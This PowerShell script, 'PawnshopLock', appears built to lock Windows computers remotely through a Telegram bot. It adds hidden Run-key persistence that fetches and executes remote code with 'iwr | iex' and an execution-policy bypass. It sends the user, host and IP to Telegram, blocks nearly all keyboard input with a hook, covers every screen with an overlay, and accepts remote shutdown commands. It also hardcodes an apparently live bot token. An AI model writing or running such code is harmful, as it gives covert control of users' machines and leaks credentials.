# ===============================
# PawnshopLock v5.2 (emoji-free)
# ===============================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ------------- CONFIG ------------------------------------
$imageURL = 'https://raw.githubusercontent.com/diezul/x/main/1.png'
$botToken = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'
$chatID   = '656189986'
$rawURL   = 'https://raw.githubusercontent.com/diezul/x/main/pawnlock.ps1'

# -------- Autorun (HKCU\Run) -----------------------------
$runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$val    = 'PawnshopLock'
$cmd    = "powershell -w hidden -ep Bypass -Command `"iwr $rawURL | iex`""
if ((Get-ItemProperty $runKey -Name $val -ErrorAction SilentlyContinue).$val -ne $cmd) {
    try {
        New-Item -Path $runKey -Force | Out-Null
        Set-ItemProperty -Path $runKey -Name $val -Value $cmd
    } catch {}
}

# -------- Variables --------------------------------------
$user    = $env:USERNAME
$pc      = $env:COMPUTERNAME
$lockC   = "/lock$user".ToLower()
$unlkC   = "/unlock$user".ToLower()
$shutC   = "/shutdown$user".ToLower()
$tempImg = "$env:TEMP\pawnlock.jpg"
try { Invoke-WebRequest $imageURL -OutFile $tempImg -UseBasicParsing } catch {}

function SendTG($msg) {
    try {
        $body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -ContentType 'application/json' -Body $body -TimeoutSec 10
    } catch {}
}
function GetIP {
    try {
        (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^(127|169\.254|0\.|255|fe80)' })[0].IPAddress
    } catch { 'n/a' }
}

# -------- Keyboard Blocker --------------------------------
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KB {
    static IntPtr h = IntPtr.Zero;
    delegate IntPtr P(int n, IntPtr w, IntPtr l);
    static P d = Hook;
    const int WH = 13, WM1 = 0x100, WM2 = 0x104;
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, P cb, IntPtr m, uint t);
    [DllImport("user32.dll")] static extern bool    UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
    public static void Block()   { if(h==IntPtr.Zero) h = SetWindowsHookEx(WH,d,GetModuleHandle(null),0); }
    public static void Unblock() { if(h!=IntPtr.Zero){ UnhookWindowsHookEx(h); h = IntPtr.Zero; } }
    static IntPtr Hook(int n, IntPtr w, IntPtr l) {
        if(n>=0 && (w==(IntPtr)WM1 || w==(IntPtr)WM2)){
            int vk = Marshal.ReadInt32(l);
            if(vk==0x43) return CallNextHookEx(h,n,w,l); // allow 'C'
            return (IntPtr)1; // block others
        }
        return CallNextHookEx(h,n,w,l);
    }
}
"@

# -------- Lock screen overlay -----------------------------
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$forms = $null
function Lock-Screen {
    if ($forms) { return }
    [KB]::Block()
    $forms = @()
    foreach ($screen in [Windows.Forms.Screen]::AllScreens) {
        $f = New-Object Windows.Forms.Form -Property @{
            FormBorderStyle='None'; WindowState='Maximized'; StartPosition='Manual'
            TopMost=$true; Location=$screen.Bounds.Location; Size=$screen.Bounds.Size
            BackColor='Black'; KeyPreview=$true
        }
        $pb = New-Object Windows.Forms.PictureBox -Property @{
            Image=[Drawing.Image]::FromFile($tempImg); Dock='Fill'; SizeMode='StretchImage'
        }
        $f.Controls.Add($pb)
        $f.Add_Deactivate({ $_.Activate() })
        $f.Add_KeyDown({ if ($_.KeyCode -eq 'C') { Unlock-Screen }; $_.Handled = $true })
        $f.Show()
        $forms += $f
    }
    SendTG "$pc locked."
}
function Unlock-Screen {
    if (!$forms) { return }
    foreach ($f in $forms) { try { $f.Close() } catch {} }
    $forms = $null
    [KB]::Unblock()
    SendTG "$pc unlocked."
}

# -------- Telegram Listener -------------------------------
SendTG "Service online on $pc ($user) | IP: $(GetIP())"
$offset = 0

# --- Start Telegram Poll in background ---
$timer = New-Object Windows.Forms.Timer
$timer.Interval = 4000
$timer.Add_Tick({
    try {
        $url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
        $updates = Invoke-RestMethod -Uri $url -TimeoutSec 10
        foreach ($u in $updates.result) {
            $offset = $u.update_id + 1
            $txt = $u.message.text.ToLower() -replace "@\\S+", "" -replace "\\s+", ""
            if ($u.message.chat.id -ne [int]$chatID) { continue }

            if ($txt -eq $lockC)      { Lock-Screen }
            elseif ($txt -eq $unlkC)  { Unlock-Screen }
            elseif ($txt -eq $shutC)  { SendTG "$pc shutting down."; Stop-Computer -Force }
        }
    } catch { }
})
$timer.Start()

# -------- Required message loop for forms ------------------
[System.Windows.Forms.Application]::Run()

# -------- Cleanup -------------------------------------------
$timer.Stop()
[KB]::Unblock()
